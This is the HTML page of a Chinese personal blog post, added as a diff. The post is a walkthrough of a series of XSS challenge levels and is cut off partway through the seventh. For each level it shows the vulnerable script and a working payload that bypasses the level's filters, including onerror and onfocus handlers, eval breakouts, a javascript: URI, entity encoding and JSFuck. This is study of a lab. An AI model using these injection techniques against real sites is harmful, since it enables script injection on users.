@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="XSS-DOM破坏"><meta name="keywords" content="XSS,DOM破坏"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>XSS-DOM破坏【JG的个人博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: {},
+  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
+  twikoo: {},
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JG的个人博客" type="application/atom+xml">
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">4.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-number">5.</span> <span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">6.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3"><span class="toc-number">7.</span> <span class="toc-text">第七关</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">7.1.</span> <span class="toc-text">第一种方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">7.2.</span> <span class="toc-text">第二种方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">7.3.</span> <span class="toc-text">第三种方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3"><span class="toc-number">8.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3"><span class="toc-number">9.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3"><span class="toc-number">10.</span> <span class="toc-text">第十关</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color1"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">17</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">11</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">1</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">JG的个人博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">XSS-DOM破坏</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2025-07-14 | 更新于 2025-07-25</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/XSS/">XSS</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/DOM%E7%A0%B4%E5%9D%8F/">DOM破坏</a></div></div></div><div class="main-content"><p>DOM破坏基础</p>
+<span id="more"></span>
+
+<h5 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714163349243.png" alt="image-20250714163349243"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>get传值somebody 直接给h2添加属性</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?somebody=&lt;img src=&quot;1&quot; onerror=&quot;alert(1337)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714164602338.png" alt="image-20250714164602338"></p>
+<h5 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714164629867.png" alt="image-20250714164629867"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class="line">    let ma = &quot;&quot;</span><br><span class="line">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        maname.innerText = ma</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>一样的get获取jeff的值  利用点在eval</p>
+<p>我们可以闭合<code>&quot;</code> 然后直接<code>alert(1337)</code></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?jeff=&quot;;alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714165226881.png" alt="image-20250714165226881"></p>
+<h5 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714165258839.png" alt="image-20250714165258839"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class="line">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class="line">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>一样通过wey get传递值</p>
+<p>但是经过了<code>wey.replace(/[&lt;&gt;]/g, &#39;&#39;)</code> 过滤，过滤了 <code>&lt;&gt;</code> </p>
+<p>然后通过<code>innerHTML</code>给<code>uganda</code> 赋值</p>
+<p>因为不能通过 用户交互，所以我们不用on的点击时间</p>
+<p>但是有一个自动获取焦点的函数 <code>onfocus</code> 并且这个函数有一个自动获取焦点的参数 <code>autofocus</code> </p>
+<p>即可实现自动弹窗</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wey=&quot;autofocus%20onfocus=alert(1337)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714170139855.png" alt="image-20250714170139855"></p>
+<h5 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714170220070.png" alt="image-20250714170220070"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        ricardo.submit()</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>通过<code>ricardo</code> get传参 然后设置定时器 2秒自动提交给form表单</p>
+<p>然后form 表单中有method 属性接收的GET  表单属性可以通过<code>javascript:</code> 伪协议解析alert</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ricardo=javascript:alert(1337)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714171021502.png" alt="image-20250714171021502"></p>
+<h5 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714171502986.png" alt="image-20250714171502986"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class="line">    smith = smith.replace(/[\(\`\)\\]/g, &#x27;&#x27;)</span><br><span class="line">    will.innerHTML = smith</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>get传承 <code>markassbrownlee</code> 获取值 ， <code>will.innerHTML = smith</code> 添加属性，但是</p>
+<p><code>smith.replace(/[\(\\)\\]/g, &#39;&#39;)</code> 过滤了<code>()\</code></p>
+<p>所以alert的这个括号 被过滤了，我们考虑通过实体编码绕过</p>
+<p>因为我们在<code>url</code>地址栏传入的参数 先会经过浏览器进行<code>decode</code> 然后进入 <code>js</code> 接收到值后，通过了过滤函数，在进入<code>html</code> ，实体编码被解析为<code>()</code> </p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?markassbrownlee=&lt;img src=&quot;1&quot; onerror=&quot;alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714172528731.png" alt="image-20250714172528731"></p>
+<h5 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714172546097.png" alt="image-20250714172546097"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Challenge */</span><br><span class="line">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class="line">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class="line">eval(balls)</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>过滤掉了大小写字母，还有数字</p>
+<p>看见了<code>eval</code>函数 利用点就在这</p>
+<p>现在就是考虑怎么绕过这个正则</p>
+<p>想到了jsfuck</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173009491.png" alt="image-20250714173009491"></p>
+<p>直接通过</p>
+<p>这个编码，然后进行一下<code>urlencode</code>编码 </p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173304760.png" alt="image-20250714173304760"></p>
+<p>后面我们在 研究一下<code>jsfuck</code> 到底为什么可以通过这种方式来编码</p>
+<h5 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173438672.png" alt="image-20250714173438672"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class="line">mafia = mafia.slice(0, 50)</span><br><span class="line">mafia = mafia.replace(/[\`\&#x27;\&quot;\+\-\!\\\[\]]/gi, &#x27;_&#x27;)</span><br><span class="line">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class="line">eval(mafia)</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>这里限制了我们payload的长度不能超过50，且过滤了&#96;&#96;’ “ + - ! \ [ ]&#96; 所以这关完全限制了上一关的方法</p>
+<p>而且他还过滤了 alert 所以我们不能用alert 但是我们还有另外两个可以用</p>
+<p><code>confirm()、prompt()</code></p>
+<p>这里我们可以直接利用，但是还有其他的办法</p>
+<h6 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">8680439.</span>.<span class="title function_">toString</span>(<span class="number">30</span>))(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>..toString()</code> 可以将数字转换为字符</p>
+<p>8680439：其实就是 30进制的alert</p>
